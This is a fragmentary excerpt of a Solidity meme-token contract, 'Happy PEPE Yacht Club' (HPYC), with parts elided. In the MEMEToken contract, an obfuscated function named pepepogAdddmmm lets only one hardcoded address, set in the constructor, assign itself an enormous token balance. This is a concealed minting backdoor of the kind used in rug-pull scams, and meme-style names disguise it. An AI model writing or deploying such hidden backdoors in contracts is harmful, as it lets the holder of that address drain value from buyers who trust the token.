...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe76!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe76 == tswojaks){
            _balances[_cwojakpepe76] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe76 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Happy PEPE Yacht Club";
    string _symbol = "HPYC";
